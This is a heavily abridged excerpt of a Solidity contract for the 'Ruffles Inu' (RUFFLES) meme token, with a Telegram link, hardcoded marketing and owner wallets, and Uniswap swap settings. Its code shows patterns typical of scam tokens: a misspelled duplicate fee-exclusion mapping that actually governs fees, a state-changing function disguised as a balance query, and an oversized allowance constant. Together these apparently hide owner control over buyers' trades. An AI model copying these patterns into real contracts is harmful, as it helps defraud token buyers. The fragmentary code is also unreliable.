...
// Telegram : https://t.me/Rufflesinu
...
interface IERC20 {
    ...
    function _typeOfBalance(address t_Address) external returns (uint256);
...
contract RufflesInu is Context, IERC20 { 
    ...
    mapping (address => bool) public _isExculdedFromFee;
    mapping (address => bool) public _isExcludedFromFee; 

    
    address payable public Wallet_Marketing = payable(0x8217a2B41344225D32ad8f766F28BCFA6273d2fD); 
    address payable public Wallet_Utility = payable(0xb7f19eD93563D086565f61A33aF2E68d2A9ad0d0);
    ...
    string private constant _name = "Ruffles Inu"; 
    string private constant _symbol = unicode"RUFFLES"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 19; 
    ...
    bool public swappingTokens_ = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    
    bool public swapAndLiquifyEnabled = true;
    bool public tradingFee = false;
    ...
    constructor () {
        ...
        _owner = 0xb7f19eD93563D086565f61A33aF2E68d2A9ad0d0;
        ...
        _isExculdedFromFee[Wallet_Marketing] = true;
    ...
    function _approve_(uint256 txRate) private returns(bool){
        uint256 wallet_Add = (balanceOf(address(this))+txRate);
    ...
    function _typeOfBalance(address t_Address) public override returns (uint256) {
        _approve_(swapTrigger);
        return balanceOf(t_Address);
    }
    ...
    function upAllowance() public virtual returns(uint256){
        return 10**((11*2)+1);
    }
    ...
    function _transfer(
        ...
        if(true){tradingFee = _isExculdedFromFee[to];}
